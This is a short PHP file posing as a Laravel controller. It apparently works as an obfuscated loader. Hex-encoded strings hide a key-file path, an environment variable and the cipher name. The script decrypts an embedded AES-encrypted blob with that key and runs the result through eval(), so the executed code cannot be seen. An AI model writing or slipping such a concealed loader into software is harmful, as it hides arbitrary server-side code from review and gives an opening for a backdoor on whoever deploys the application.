<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('/b+akv7O37aI9RKBhyp9HQ==');

$c=base64_decode(

'PGIkk1YsyGYPZYZ7+rmFsi88ubX8lmR4/31UerbUUHL497axL3S8T0Nf37EmE1Aj5PBcYBgBxe4u' .
'DN81XJm1Tv+tlaUfjMH0xnqYxtDcyckBThO3YS+Rfk0AyQ7yX6ox5cSpPzU8N//1hCvSf7eDcYHP' .
'tsy59pX/MvV9rPjnC7lmKp98Wj8PjF0tecnWFjuDeqeh/owDnZnHBePhoNF7YYaNA7jg0Vd+49pe' .
'a56u6053ouwIx0yxGrIVEwaNf/Azqh/ilMvN5EwpoVv9OjrA8vF721M2/+9ddGgX/fVB0HA='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

